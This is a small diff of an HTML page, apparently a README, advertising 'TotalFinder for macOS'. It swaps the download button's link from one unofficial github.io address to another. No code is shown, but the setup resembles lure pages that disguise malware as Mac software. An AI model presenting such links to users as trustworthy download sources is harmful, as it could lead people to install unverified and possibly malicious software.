@@ -6,7 +6,7 @@
 <h3>TotalFinder for macOS</h3>
 <p>TotalFinder is a specialized file manager and Finder enhancement solution designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://quick-mac-install.github.io/.github/TotalFinder">
+<a href="https://software-osx-deploy.github.io/.github/TotalFinder">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
